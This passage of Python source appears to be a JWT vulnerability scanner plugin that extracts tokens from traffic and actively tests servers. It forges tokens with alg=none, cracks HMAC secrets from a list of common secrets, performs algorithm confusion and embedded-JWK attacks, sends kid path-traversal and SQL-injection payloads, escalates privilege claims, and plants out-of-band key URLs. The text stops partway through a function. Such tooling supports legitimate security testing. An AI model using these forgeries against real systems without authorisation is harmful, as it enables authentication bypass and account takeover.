# JWT vulnerability scanner.
#
# The plugin mirrors object_storage's two-phase shape:
# 1. observe(context) passively extracts JWTs from traffic and returns queue
#    targets without reporting discovery findings.
# 2. check(target) runs passive risk checks and active replay checks from the
#    dedicated jwt queue.

import base64
import copy
import hashlib
import hmac
import json
import os
import re
import socket
import ssl
import threading
import time
import uuid
from dataclasses import dataclass, field
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qsl, quote_plus, urlsplit, urlunsplit
from urllib.request import (
    HTTPSHandler,
    HTTPRedirectHandler,
    ProxyHandler,
    Request,
    build_opener,
)

from pass_scan.body_paser import decode_body_text, get_header
from pass_scan.reporter import print_finding_once, write_html_report, write_jsonl
from pass_scan.scan_context import replace_json_body_parameter
from pass_scan.terminal import red, yellow


VULN_FILE = os.environ.get("PASS_SCAN_VULN_FILE", os.path.join("logs", "vulns.jsonl"))
REPORT_FILE = os.environ.get("PASS_SCAN_REPORT_FILE", "report.html")

TIMEOUT = 10
MAX_COMPARE_CHARS = 400000
MAX_PROOF_CHARS = 24000
MAX_BODY_PREVIEW_BYTES = 16000
MAX_SCAN_CHARS = 400000

JWT_RE = re.compile(
    r"(?<![A-Za-z0-9_-])(?P<token>[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{0,4096})(?![A-Za-z0-9_-])"
)

JWE_RE = re.compile(
    r"(?<![A-Za-z0-9_-])(?P<token>[A-Za-z0-9_-]{8,}(?:\.[A-Za-z0-9_-]{1,4096}){4})(?![A-Za-z0-9_-])"
)

AUTH_SCHEME_RE = re.compile(r"^\s*(Bearer|JWT|Token)\s+(.+?)\s*$", re.I)

HOP_BY_HOP_HEADERS = {
    "host",
    "content-length",
    "transfer-encoding",
    "connection",
    "proxy-connection",
    "proxy-authorization",
    "upgrade",
    "if-none-match",
    "if-modified-since",
    "if-match",
    "if-unmodified-since",
    "if-range",
    "range",
}

TOKEN_NAME_KEYWORDS = (
    "jwt",
    "token",
    "access_token",
    "id_token",
    "refresh_token",
    "auth",
    "authorization",
    "session",
)

SENSITIVE_CLAIM_RE = re.compile(
    r"(password|passwd|pwd|secret|api[_-]?key|access[_-]?key|private[_-]?key|credential|"
    r"token|id[_-]?card|身份证)",
    re.I,
)

PRIVILEGE_CLAIMS = (
    "admin",
    "is_admin",
    "isAdmin",
    "isRoot",
    "superuser",
    "root",
    "role",
    "roles",
    "scope",
    "scopes",
    "permissions",
    "authorities",
)

AUTH_FAILURE_KEYWORDS = (
    "unauthorized",
    "forbidden",
    "invalid token",
    "token invalid",
    "bad token",
    "expired token",
    "jwt expired",
    "signature",
    "not authenticated",
    "authentication required",
    "login required",
    "请登录",
    "未登录",
    "无权限",
    "鉴权",
    "认证失败",
    "登录已过期",
)

COMMON_HMAC_SECRETS = (
    "",
    "secret",
    "jwt_secret",
    "jwt-secret",
    "your-256-bit-secret",
    "your-384-bit-secret",
    "your-512-bit-secret",
    "changeme",
    "changeit",
    "password",
    "passw0rd",
    "123456",
    "123456789",
    "qwerty",
    "admin",
    "test",
    "dev",
    "development",
    "production",
    "staging",
    "local",
    "localhost",
    "default",
    "privatekey",
    "publickey",
    "key",
    "signingkey",
    "authsecret",
    "spring",
    "django",
    "flask",
    "express",
    "laravel",
)

JWT_METHOD_LABELS = {
    "jwt_sensitive_claim": "JWT 敏感信息泄露",
    "jwt_token_exposure": "JWT 暴露风险",
    "jwt_none_alg": "JWT alg=none",
    "jwt_signature_bypass": "JWT 签名未校验",
    "jwt_weak_secret": "JWT 弱 HMAC 密钥",
    "jwt_algorithm_confusion": "JWT 算法混淆",
    "jwt_embedded_jwk": "JWT JWK 头信任",
    "jwt_remote_key_fetch": "JWT 远程密钥获取",
    "jwt_kid_injection": "JWT kid 注入",
    "jwt_claim_tamper": "JWT Claim 篡改",
    "jwt_time_claim": "JWT 时间 Claim 校验缺失",
    "jwt_issuer_audience": "JWT iss/aud 校验缺失",
}


class NoRedirectHandler(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


@dataclass
class ParsedJWT:
    raw: str
    token_type: str
    header: dict
    payload: dict
    header_segment: str
    payload_segment: str
    signature_segment: str = ""
    segments: list = field(default_factory=list)

    @property
    def alg(self):
        return str(self.header.get("alg") or "").strip()

    @property
    def kid(self):
        return str(self.header.get("kid") or "").strip()

    @property
    def typ(self):
        return str(self.header.get("typ") or "").strip()

    @property
    def is_jws(self):
        return self.token_type == "jws"

    @property
    def signing_input(self):
        return f"{self.header_segment}.{self.payload_segment}".encode("ascii")

    @property
    def signature(self):
        return b64url_decode(self.signature_segment)


@dataclass
class JwtLocation:
    place: str
    name: str
    value: str
    source: str
    from_request: bool
    index: int = -1
    json_path: list = field(default_factory=list)
    charset: str = "utf-8"
    header_scheme: str = ""
    cookie_attrs: dict = field(default_factory=dict)
    token_offset: int = -1


@dataclass
class JwtTarget:
    method: str
    url: str
    host: str
    flow: object
    token: ParsedJWT
    location: JwtLocation


class JWTScanner:
    """JWT scanner with passive discovery and a dedicated active queue."""

    name = "jwt"
    observer_only = True

    def __init__(self, config=None, vuln_file=None, report_file=None):
        self.config = config or {}
        self.active_probe = bool(self.config.get("active_probe", True))
        self.weak_secret_scan = bool(self.config.get("weak_secret_scan", True))
        self.claim_tamper = bool(self.config.get("claim_tamper", False))
        self.algorithm_confusion_scan = bool(
            self.config.get("algorithm_confusion_scan", False)
        )
        self.embedded_jwk_scan = bool(self.config.get("embedded_jwk_scan", False))
        self.kid_injection_scan = bool(self.config.get("kid_injection_scan", False))
        self.remote_key_fetch_scan = bool(
            self.config.get("remote_key_fetch_scan", False)
        )
        self.jwks_discovery = bool(self.config.get("jwks_discovery", False))
        self.oob_enabled = self.remote_key_fetch_scan and bool(
            (self.config.get("oob") or {}).get("enabled", False)
        )
        self.max_scan_chars = int(self.config.get("max_scan_chars", MAX_SCAN_CHARS))
        self.max_tokens_per_context = int(self.config.get("max_tokens_per_context", 12))
        self.max_secret_candidates = int(self.config.get("max_secret_candidates", 160))
        self.vuln_file = vuln_file or VULN_FILE
        self.report_file = report_file or REPORT_FILE
        self.lock = threading.Lock()
        self.reported = set()
        self.scanned = set()
        self.waf_state = None
        self.on_finding = None
        self.oob = JWTKeyFetchOOBManager(
            self.config.get("oob"), self.handle_oob_interaction
        )
        if self.remote_key_fetch_scan:
            self.oob.start()

        ssl_context = ssl._create_unverified_context()
        self.opener = build_opener(
            ProxyHandler({}),
            HTTPSHandler(context=ssl_context),
            NoRedirectHandler,
        )
        os.makedirs(os.path.dirname(self.vuln_file) or ".", exist_ok=True)

    # ------------------------------------------------------------------
    # Scheduler interface
    # ------------------------------------------------------------------

    def observe(self, context):
        tokens = self.extract_tokens(context)
        tasks = []

        for token, location in tokens[: self.max_tokens_per_context]:
            tasks.append(
                JwtTarget(
                    method=context.method,
                    url=context.url,
                    host=context.host,
                    flow=context.flow,
                    token=token,
                    location=location,
                )
            )

        return tasks

    def interested(self, _context):
        return False

    def dedup_key(self, target):
        token = target.token
        location = target.location
        return (
            target.method,
            target.host,
            self.normalize_path_for_dedup(urlsplit(target.url).path),
            location.place,
            location.name,
            location.index,
            self.token_fingerprint(token),
        )

    def enqueue_log_key(self, target):
        location = target.location
        return (
            target.method,
            target.host,
            self.normalize_path_for_dedup(urlsplit(target.url).path),
            location.source,
        )

    def task_label(self, target):
        token = target.token
        location = target.location
        if not location.from_request:
            return (
                f"{target.method} {target.url} | "
                f"JWT {location.source}"
            )

        kid = f" kid={token.kid}" if token.kid else ""
        return (
            f"{target.method} {target.url} | "
            f"JWT {location.source} alg={token.alg or 'unknown'}{kid}"
        )

    def token_fingerprint(self, token):
        return hashlib.sha256(token.raw.encode("utf-8", errors="replace")).hexdigest()

    def check(self, target, flow=None):
        if flow is not None:
            return []
        if not isinstance(target, JwtTarget):
            return []

        scan_key = self.dedup_key(target)
        with self.lock:
            if scan_key in self.scanned:
                return []
            self.scanned.add(scan_key)

        findings = []
        for finding in self.passive_findings(target):
            if self.write_finding_once(finding):
                findings.append(finding)

        if not self.active_probe or not target.location.from_request or not target.token.is_jws:
            return findings

        flow = target.flow
        baseline = self.build_baseline(flow)
        if not baseline or not self.response_accepted(baseline):
            return findings

        negative = self.build_negative_control(flow, target)
        if not negative or self.response_accepted_like(baseline, negative):
            return findings

        bad_sig = self.corrupt_signature_token(target.token)
        signature_bypass_found = False
        finding = self.check_probe_acceptance(
            flow,
            target,
            baseline,
            negative,
            bad_sig,
            "jwt_signature_bypass",
            {
                "technique": "签名未校验",
                "message": "corrupted JWT signature was still accepted while missing/empty token was rejected",
                "payload_group": "corrupt_signature",
                "confidence": "high",
            },
        )
        if finding:
            findings.append(finding)
            signature_bypass_found = True

        secret = self.find_weak_hmac_secret(target.token, target.host)
        if secret is not None:
            finding = self.weak_secret_finding(flow, target, secret)
            if self.write_finding_once(finding):
                findings.append(finding)

        if not signature_bypass_found:
            for finding in self.check_none_algorithm(flow, target, baseline, negative):
                findings.append(finding)

            if self.algorithm_confusion_scan:
                for finding in self.check_key_confusion(flow, target, baseline, negative):
                    findings.append(finding)

            if self.embedded_jwk_scan:
                for finding in self.check_embedded_jwk(flow, target, baseline, negative):
                    findings.append(finding)

            if self.kid_injection_scan:
                for finding in self.check_kid_injection(flow, target, baseline, negative):
                    findings.append(finding)

            if self.remote_key_fetch_scan:
                self.fire_remote_key_fetch_oob(flow, target)

            if secret is not None and self.claim_tamper:
                for finding in self.check_signed_claim_mutations(
                    flow,
                    target,
                    baseline,
                    negative,
                    secret,
                ):
                    findings.append(finding)

        return findings

    # ------------------------------------------------------------------
    # Token extraction
    # ------------------------------------------------------------------

    def extract_tokens(self, context):
        results = []
        seen = set()

        def add(raw, location):
            token = parse_jwt(raw)
            if not token:
                return
            key = (token.raw, location.place, location.name, location.source)
            if key in seen:
                return
            seen.add(key)
            results.append((token, location))

        request = getattr(context.flow, "request", None)
        response = getattr(context.flow, "response", None)

        if request is not None:
            auth = get_header(request.headers, "authorization")
            if auth:
                match = AUTH_SCHEME_RE.match(auth)
                if match:
                    add(
                        match.group(2),
                        JwtLocation(
                            place="header",
                            name="Authorization",
                            value=match.group(2),
                            source="request.header.Authorization",
                            from_request=True,
                            header_scheme=match.group(1),
                        ),
                    )
                else:
                    for raw in self.jwt_strings_from_text(auth):
                        add(
                            raw,
                            JwtLocation(
                                place="header",
                                name="Authorization",
                                value=raw,
                                source="request.header.Authorization",
                                from_request=True,
                            ),
                        )

            cookie_header = get_header(request.headers, "cookie")
            for index, (name, value) in enumerate(parse_cookie_pairs(cookie_header)):
                if self.name_looks_token_related(name) or looks_like_jwt(value):
                    add(
                        value,
                        JwtLocation(
                            place="cookie",
                            name=name,
                            value=value,
                            source=f"request.cookie.{name}",
                            from_request=True,
                            index=index,
                        ),
                    )

            for param in context.parameters:
                if param.get("place") not in ("query", "form", "json"):
                    continue
                value = str(param.get("value") or "")
                if not (self.name_looks_token_related(param.get("name", "")) or looks_like_jwt(value)):
                    continue
                add(
                    value,
                    JwtLocation(
                        place=param["place"],
                        name=param.get("name", ""),
                        value=value,
                        source=f"request.{param['place']}.{param.get('name', '')}",
                        from_request=True,
                        index=int(param.get("index", -1)),
                        json_path=list(param.get("json_path") or []),
                        charset=param.get("charset") or "utf-8",
                    ),
                )

            for name, value in request.headers.items():
                lower = name.lower()
                if lower in ("authorization", "cookie"):
                    continue
                if self.name_looks_token_related(name) or "jwt" in str(value).lower():
                    for raw in self.jwt_strings_from_text(str(value)):
                        add(
                            raw,
                            JwtLocation(
                                place="header",
                                name=name,
                                value=raw,
                                source=f"request.header.{name}",
                                from_request=True,
                            ),
                        )

        if response is not None:
            for cookie in self.response_cookies(response.headers):
                value = cookie.get("value", "")
                if self.name_looks_token_related(cookie.get("name", "")) or looks_like_jwt(value):
                    add(
                        value,
                        JwtLocation(
                            place="set_cookie",
                            name=cookie.get("name", ""),
                            value=value,
                            source=f"response.set_cookie.{cookie.get('name', '')}",
                            from_request=False,
                            cookie_attrs=cookie.get("attrs", {}),
                        ),
                    )

            for name, value in response.headers.items():
                if name.lower() == "set-cookie":
                    continue
                if self.name_looks_token_related(name) or "jwt" in str(value).lower():
                    for raw in self.jwt_strings_from_text(str(value)):
                        add(
                            raw,
                            JwtLocation(
                                place="response_header",
                                name=name,
                                value=raw,
                                source=f"response.header.{name}",
                                from_request=False,
                            ),
                        )

            body = response.content or b""
            if body:
                text, _charset = decode_body_text(body, response.headers)
                for raw in self.jwt_strings_from_text(text[: self.max_scan_chars]):
                    add(
                        raw,
                        JwtLocation(
                            place="response_body",
                            name="body",
                            value=raw,
                            source="response.body",
                            from_request=False,
                        ),
                    )

        return results

    def jwt_strings_from_text(self, text):
        values = []
        for regex in (JWT_RE, JWE_RE):
            for match in regex.finditer(text or ""):
                raw = match.group("token").strip().strip("'\"`<>[]{}(),;")
                if raw and raw not in values:
                    values.append(raw)
        return values

    def name_looks_token_related(self, name):
        lowered = str(name or "").lower()
        return any(keyword in lowered for keyword in TOKEN_NAME_KEYWORDS)

    def response_cookies(self, headers):
        cookies = []
        values = []
        if hasattr(headers, "get_all"):
            values = headers.get_all("set-cookie") or []
        else:
            values = [
                value for name, value in (headers or {}).items()
                if name.lower() == "set-cookie"
            ]
        for value in values:
            parts = [part.strip() for part in str(value).split(";") if part.strip()]
            if not parts or "=" not in parts[0]:
                continue
            name, cookie_value = parts[0].split("=", 1)
            attrs = {}
            for item in parts[1:]:
                if "=" in item:
                    attr_name, attr_value = item.split("=", 1)
                    attrs[attr_name.lower()] = attr_value
                else:
                    attrs[item.lower()] = True
            cookies.append({"name": name, "value": cookie_value, "attrs": attrs})
        return cookies

    # ------------------------------------------------------------------
    # Passive findings
    # ------------------------------------------------------------------

    def passive_findings(self, target):
        findings = []
        token = target.token
        location = target.location
        flow = target.flow
        response = getattr(flow, "response", None)
        status_code = getattr(response, "status_code", 0) if response else 0

        if token.is_jws and token.alg.lower() == "none":
            findings.append(
                self.build_finding(
                    flow,
                    location,
                    "jwt_none_alg",
                    {
                        "technique": "alg=none",
                        "message": "JWT header declares alg=none",
                        "jwt_alg": token.alg,
                        "jwt_kid": token.kid,
                        "jwt_claims": self.safe_claim_summary(token.payload),
                        "confidence": "high" if location.from_request and status_code < 400 else "medium",
                    },
                    proof_probe=self.passive_proof(flow),
                )
            )

        sensitive = self.sensitive_claims(token.payload)
        if sensitive:
            findings.append(
                self.build_finding(
                    flow,
                    location,
                    "jwt_sensitive_claim",
                    {
                        "technique": "敏感 Claim 暴露",
                        "message": "JWT payload is client-readable and contains sensitive-looking claims",
                        "jwt_alg": token.alg,
                        "jwt_sensitive_claims": sensitive,
                        "confidence": "high" if any(item["risk"] == "high" for item in sensitive) else "medium",
                    },
                    proof_probe=self.passive_proof(flow),
                )
            )

        exposure = self.exposure_issues(location)
        if exposure:
            findings.append(
                self.build_finding(
                    flow,
                    location,
                    "jwt_token_exposure",
                    {
                        "technique": "Token 暴露位置",
                        "message": "JWT appears in a leak-prone location or cookie lacks common security attributes",
                        "jwt_alg": token.alg,
                        "jwt_exposure": exposure,
                        "confidence": "medium",
                    },
                    proof_probe=self.passive_proof(flow),
                )
            )

        time_issue = self.passive_time_claim_issue(token, target, location)
        if time_issue:
            findings.append(
                self.build_finding(
                    flow,
                    location,
                    "jwt_time_claim",
                    time_issue,
                    proof_probe=self.passive_proof(flow),
                )
            )

        if self.weak_secret_scan:
            secret = self.find_weak_hmac_secret(token, target.host)
            if secret is not None:
                findings.append(self.weak_secret_finding(flow, target, secret))

        return findings

    def sensitive_claims(self, payload):
        matches = []
        for key, value in flatten_json(payload):
            key_text = ".".join(str(item) for item in key)
            if not SENSITIVE_CLAIM_RE.search(key_text):
                continue
            rendered = redact_value(value)
            matches.append({"claim": key_text, "sample": rendered, "risk": "high"})
            if len(matches) >= 12:
                break
        return matches

    def exposure_issues(self, location):
        issues = []
        if location.from_request and location.place == "query":
            issues.append("JWT 出现在 URL query 中，容易进入日志、Referer 或浏览器历史")
        if location.place == "set_cookie":
            attrs = location.cookie_attrs or {}
            if "httponly" not in attrs:
                issues.append("Set-Cookie 缺少 HttpOnly")
            if "secure" not in attrs:
                issues.append("Set-Cookie 缺少 Secure")
        return issues

    def passive_time_claim_issue(self, token, target, location):
        now = int(time.time())
        exp = numeric_claim(token.payload.get("exp"))
        nbf = numeric_claim(token.payload.get("nbf"))
        response = getattr(target.flow, "response", None)
        status_code = getattr(response, "status_code", 0) if response else 0
        accepted = location.from_request and int(status_code or 0) < 400
        if exp and exp < now and accepted:
            return {
                "technique": "过期 Token 被接受",
                "message": "request carried an expired JWT and the captured response was not an authentication failure",
                "jwt_alg": token.alg,
                "jwt_exp": exp,
                "jwt_now": now,
                "probe_status": status_code,
                "confidence": "medium",
            }
        if nbf and nbf > now + 60 and accepted:
            return {
                "technique": "nbf 未生效 Token 被接受",
                "message": "request carried a JWT whose nbf is in the future and the captured response was not an authentication failure",
                "jwt_alg": token.alg,
                "jwt_nbf": nbf,
                "jwt_now": now,
                "probe_status": status_code,
                "confidence": "medium",
            }
        return None

    # ------------------------------------------------------------------
    # Active checks
    # ------------------------------------------------------------------

    def build_negative_control(self, flow, target):
        removed = self.send_probe(flow, target.location, "", remove_token=True)
        if removed:
            return removed
        return self.send_probe(flow, target.location, self.corrupt_signature_token(target.token))

    def check_probe_acceptance(
        self,
        flow,
        target,
        baseline,
        negative,
        token_value,
        method,
        evidence,
    ):
        probe = self.send_probe(flow, target.location, token_value)
        if not probe or probe.get("timed_out"):
            return None
        if not self.probe_confirms_bypass(baseline, negative, probe):
            return None

        evidence = dict(evidence)
        evidence.update(
            {
                "jwt_alg": parse_jwt(token_value).alg if parse_jwt(token_value) else target.token.alg,
                "jwt_kid": target.token.kid,
                "baseline_status": baseline.get("status_code"),
                "control_status": negative.get("status_code"),
                "probe_status": probe.get("status_code"),
            }
        )
        finding = self.build_finding(flow, target.location, method, evidence, proof_probe=probe)
        if self.write_finding_once(finding):
            return finding
        return None

    def check_none_algorithm(self, flow, target, baseline, negative):
        if not target.token.is_jws:
            return []
        findings = []
        variants = []
        for alg in ("none", "None", "NONE"):
            header = dict(target.token.header)
            header["alg"] = alg
            variants.append(encode_unsigned_token(header, target.token.payload))

        for token_value in dict.fromkeys(variants):
            finding = self.check_probe_acceptance(
                flow,
                target,
                baseline,
                negative,
                token_value,
                "jwt_none_alg",
                {
                    "technique": "alg=none 绕过",
                    "message": "unsigned alg=none JWT was accepted while missing/empty token was rejected",
                    "payload_group": "alg_none",
                    "confidence": "high",
                },
            )
            if finding:
                findings.append(finding)
                break
        return findings

    def check_kid_injection(self, flow, target, baseline, negative):
        if not target.token.is_jws:
            return []
        findings = []
        alg = target.token.alg.upper()
        if alg not in HMAC_HASHES:
            return findings

        kid_payloads = [
            "../../../../../../dev/null",
            "../../../../../dev/null",
            "/dev/null",
            "....//....//....//....//dev/null",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
        ]
        for kid in kid_payloads:
            header = dict(target.token.header)
            header["kid"] = kid
            token_value = encode_signed_token(header, target.token.payload, b"", alg)
            finding = self.check_probe_acceptance(
                flow,
                target,
                baseline,
                negative,
                token_value,
                "jwt_kid_injection",
                {
                    "technique": "kid 注入",
                    "message": "JWT signed with an empty key and attacker-controlled kid was accepted",
                    "payload_group": "kid_path_or_sql",
                    "jwt_kid": kid,
                    "confidence": "high",
                },
            )
            if finding:
                findings.append(finding)
                break
        return findings

    def check_key_confusion(self, flow, target, baseline, negative):
        if not target.token.is_jws:
            return []
        alg = target.token.alg.upper()
        if not (alg.startswith("RS") or alg.startswith("PS") or alg.startswith("ES")):
            return []

        public_keys = self.public_key_candidates(target.token)
        findings = []
        for label, key_bytes in public_keys[:4]:
            header = dict(target.token.header)
            header["alg"] = "HS256"
            token_value = encode_signed_token(header, target.token.payload, key_bytes, "HS256")
            finding = self.check_probe_acceptance(
                flow,
                target,
                baseline,
                negative,
                token_value,
                "jwt_algorithm_confusion",
                {
                    "technique": "RS/HS 算法混淆",
                    "message": "JWT signed as HS256 with public key material was accepted",
                    "payload_group": label,
                    "jwt_original_alg": target.token.alg,
                    "jwt_alg": "HS256",
                    "confidence": "high",
                },
            )
            if finding:
                findings.append(finding)
                break
        return findings

    def check_embedded_jwk(self, flow, target, baseline, negative):
        if not target.token.is_jws or not crypto_available():
            return []
        try:
            private_key, public_jwk = generate_rsa_jwk()
            header = dict(target.token.header)
            header["alg"] = "RS256"
            header["jwk"] = public_jwk
            header["kid"] = public_jwk["kid"]
            token_value = encode_rsa_token(header, target.token.payload, private_key, "RS256")
        except Exception:
            return []

        finding = self.check_probe_acceptance(
            flow,
            target,
            baseline,
            negative,
            token_value,
            "jwt_embedded_jwk",
            {
                "technique": "JWK 头信任",
                "message": "JWT signed with attacker-generated key and embedded jwk header was accepted",
                "payload_group": "embedded_jwk",
                "jwt_kid": header.get("kid"),
                "confidence": "high",
            },
        )
        return [finding] if finding else []

    def check_signed_claim_mutations(self, flow, target, baseline, negative, secret):
        alg = target.token.alg.upper()
        if alg not in HMAC_HASHES:
            return []

        findings = []
        for name, payload, method, evidence in self.claim_mutation_payloads(target.token.payload):
            header = dict(target.token.header)
            token_value = encode_signed_token(header, payload, secret_to_bytes(secret), alg)
            finding = self.check_probe_acceptance(
                flow,
                target,
                baseline,
                negative,
                token_value,
                method,
                {
                    **evidence,
                    "payload_group": name,
                    "jwt_alg": alg,
                    "confidence": "medium",
                },
            )
            if finding:
                findings.append(finding)
                if method == "jwt_claim_tamper":
                    break
        return findings

    def claim_mutation_payloads(self, payload):
        variants = []
        base = copy.deepcopy(payload)

        privilege = copy.deepcopy(base)
        touched = []
        for claim in PRIVILEGE_CLAIMS:
            if claim not in privilege:
                continue
            value = privilege[claim]
            if isinstance(value, bool):
                privilege[claim] = True
            elif isinstance(value, list):
                new_value = list(value)
                for item in ("admin", "root", "superuser"):
                    if item not in new_value:
                        new_value.append(item)
                privilege[claim] = new_value
            elif isinstance(value, str):
                if claim in ("scope", "scopes"):
                    privilege[claim] = value + " admin root"
                else:
                    privilege[claim] = "admin"
            elif isinstance(value, (int, float)):
                privilege[claim] = 1
            else:
                continue
            touched.append(claim)
        if not touched:
            privilege["admin"] = True
            privilege["role"] = "admin"
            touched = ["admin", "role"]
        variants.append(
            (
                "privilege_claims",
                privilege,
                "jwt_claim_tamper",
                {
                    "technique": "权限 Claim 篡改",
                    "message": "JWT with attacker-modified privilege claims was accepted",
                    "jwt_modified_claims": touched,
                },
            )
        )

        now = int(time.time())
        if "exp" in base:
            expired = copy.deepcopy(base)
            expired["exp"] = now - 3600
            variants.append(
                (
                    "expired_exp",
                    expired,
                    "jwt_time_claim",
                    {
                        "technique": "exp 校验缺失",
                        "message": "JWT re-signed with an expired exp was accepted",
                        "jwt_exp": expired["exp"],
                    },
                )
            )
        if "nbf" in base:
            future = copy.deepcopy(base)
            future["nbf"] = now + 86400
            variants.append(
                (
                    "future_nbf",
                    future,
                    "jwt_time_claim",
                    {
                        "technique": "nbf 校验缺失",
                        "message": "JWT re-signed with a future nbf was accepted",
                        "jwt_nbf": future["nbf"],
                    },
                )
            )
        if "iss" in base or "aud" in base:
            issuer = copy.deepcopy(base)
            if "iss" in issuer:
                issuer["iss"] = f"https://pass-scan-invalid-{uuid.uuid4().hex[:8]}.example.com"
            if "aud" in issuer:
                issuer["aud"] = f"pass-scan-invalid-{uuid.uuid4().hex[:8]}"
            variants.append(
                (
                    "issuer_audience",
                    issuer,
                    "jwt_issuer_audience",
                    {
                        "technique": "iss/aud 校验缺失",
                        "message": "JWT re-signed with modified iss/aud was accepted",
                        "jwt_modified_claims": [key for key in ("iss", "aud") if key in base],
                    },
                )
            )
        return variants

    def fire_remote_key_fetch_oob(self, flow, target):
        if not self.oob_enabled or not self.oob.enabled or not target.token.is_jws:
            return False
        sent_any = False
        for header_name in ("jku", "x5u"):
            token, host = self.oob.new_domain()
            if not token:
                return sent_any
            url = f"https://{host}/pass-scan-jwks.json"
            header = dict(target.token.header)
            header[header_name] = url
            header["kid"] = f"psjwt-{uuid.uuid4().hex[:8]}"
            probe_token = encode_token_with_fake_signature(header, target.token.payload)
            info = {
                "url": target.url,
                "request_method": target.method,
                "param_place": target.location.place,
                "param_name": target.location.name,
                "jwt_location": target.location.source,
                "jwt_header_param": header_name,
                "oob_domain": host,
                "payload": url,
                "request_packet": self.preview_request_packet(flow, target.location, probe_token),
            }
            self.oob.record(token, info)
            probe = self.send_probe(flow, target.location, probe_token)
            if probe and probe.get("request_packet"):
                self.oob.record(token, {"request_packet": probe.get("request_packet", "")})
            sent_any = True

        if target.token.kid:
            token, host = self.oob.new_domain()
            if token:
                header = dict(target.token.header)
                header["kid"] = f"https://{host}/kid.key"
                probe_token = encode_token_with_fake_signature(header, target.token.payload)
                info = {
                    "url": target.url,
                    "request_method": target.method,
                    "param_place": target.location.place,
                    "param_name": target.location.name,
                    "jwt_location": target.location.source,
                    "jwt_header_param": "kid",
                    "oob_domain": host,
                    "payload": header["kid"],
                    "request_packet": self.preview_request_packet(flow, target.location, probe_token),
                }
                self.oob.record(token, info)
                probe = self.send_probe(flow, target.location, probe_token)
                if probe and probe.get("request_packet"):
                    self.oob.record(token, {"request_packet": probe.get("request_packet", "")})
                sent_any = True
        return sent_any

    def handle_oob_interaction(self, info, interaction):
        protocol = (interaction.get("protocol") or "").upper()
        remote = interaction.get("remote-address") or interaction.get("remoteAddress") or ""
        finding = {
            "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
            "type": "jwt",
            "method": "jwt_remote_key_fetch",
            "request_method": info.get("request_method", ""),
            "url": info.get("url", ""),
            "param_place": info.get("param_place", ""),
            "param_name": info.get("param_name", ""),
            "evidence": {
                "technique": "远程密钥获取",
                "message": "server fetched or resolved attacker-controlled JWT key URL from token header",
                "jwt_location": info.get("jwt_location"),
                "jwt_header_param": info.get("jwt_header_param"),
                "payload": info.get("payload"),
                "oob_protocol": protocol,
                "oob_remote_address": remote,
                "oob_domain": info.get("oob_domain"),
                "confidence": "high" if protocol in ("HTTP", "HTTPS") else "medium",
            },
            "proof": {
                "request": info.get("request_packet", ""),
                "response": self.oob_proof_text(interaction),
            },
            "extra_proofs": [],
        }
        self.write_finding_once(finding)

    def oob_proof_text(self, interaction):
        lines = ["[OOB interaction]"]
        for key in ("protocol", "unique-id", "full-id", "remote-address", "timestamp", "q-type"):
            value = interaction.get(key)
            if value:
                lines.append(f"{key}: {value}")
        raw = interaction.get("raw-request") or interaction.get("rawRequest")
        if raw:
            lines.append("")
            lines.append(str(raw))
        return "\n".join(lines)

    # ------------------------------------------------------------------
    # Weak secret and public key discovery
    # ------------------------------------------------------------------

    def find_weak_hmac_secret(self, token, host=""):
        if not self.weak_secret_scan or not token.is_jws:
            return None
        alg = token.alg.upper()
        if alg not in HMAC_HASHES:
            return None
        for secret in self.hmac_secret_candidates(token, host):
            expected = sign_hmac(token.signing_input, secret_to_bytes(secret), alg)
            if hmac.compare_digest(expected, token.signature):
                return secret
        return None

    def hmac_secret_candidates(self, token, host=""):
        candidates = list(COMMON_HMAC_SECRETS)
        parts = urlsplit(host if "://" in str(host) else f"https://{host or ''}")
        hostname = parts.hostname or str(host or "").split(":", 1)[0]
        issuer = str(token.payload.get("iss") or "")
        audience = token.payload.get("aud")
        extra = []
        for value in (hostname, issuer, audience):
            if isinstance(value, list):
                extra.extend(str(item) for item in value)
            elif value:
                extra.append(str(value))
        for item in extra:
            cleaned = re.sub(r"^https?://", "", item).strip("/ ")
            if not cleaned:
                continue
            candidates.extend(
                [
                    cleaned,
                    cleaned.lower(),
                    cleaned.split(".")[0],
                    f"{cleaned}_secret",
                    f"{cleaned}-secret",
                    f"{cleaned}.secret",
                    f"{cleaned}123",
                ]
            )
        seen = []
        for item in candidates:
            if item not in seen:
                seen.append(item)
            if len(seen) >= self.max_secret_candidates:
                break
        return seen

    def public_key_candidates(self, token):
        candidates = []
        for label, value in self.header_public_key_candidates(token.header):
            candidates.append((label, value))
        if self.jwks_discovery:
            for label, value in self.discovery_public_keys(token):
                candidates.append((label, value))

        deduped = []
        seen = set()
        for label, value in candidates:
            if not value:
                continue
            key = hashlib.sha256(value).hexdigest()
            if key in seen:
                continue
            seen.add(key)
            deduped.append((label, value))
        return deduped

    def header_public_key_candidates(self, header):
        candidates = []
        x5c = header.get("x5c")
        if isinstance(x5c, list) and x5c:
            cert_b64 = str(x5c[0])
            try:
                der = base64.b64decode(cert_b64 + "=" * (-len(cert_b64) % 4))
                cert_pem = (
                    b"-----BEGIN CERTIFICATE-----\n"
                    + wrap_b64(cert_b64).encode("ascii")
                    + b"\n-----END CERTIFICATE-----\n"
                )
                candidates.append(("x5c_certificate_pem", cert_pem))
                pub_pem = public_key_pem_from_certificate(der)
                if pub_pem:
                    candidates.append(("x5c_public_key_pem", pub_pem))
            except Exception:
                pass
        jwk = header.get("jwk")
        if isinstance(jwk, dict):
            pem = public_key_pem_from_jwk(jwk)
            if pem:
                candidates.append(("header_jwk_public_key", pem))
        return candidates

    def discovery_public_keys(self, token):
        issuer = str(token.payload.get("iss") or "").strip()
        urls = []
        if issuer.startswith(("http://", "https://")):
            base = issuer.rstrip("/")
            urls.append(f"{base}/.well-known/openid-configuration")
        for header_key in ("jku", "x5u"):
            value = str(token.header.get(header_key) or "").strip()
            if value.startswith(("http://", "https://")):
                urls.append(value)

        keys = []
        for url in urls[:3]:
            obj = self.fetch_json(url)
            if not obj:
                continue
            if "jwks_uri" in obj:
                jwks = self.fetch_json(str(obj.get("jwks_uri")))
            else:
                jwks = obj
            for jwk in (jwks or {}).get("keys", []) if isinstance(jwks, dict) else []:
                if token.kid and jwk.get("kid") and str(jwk.get("kid")) != token.kid:
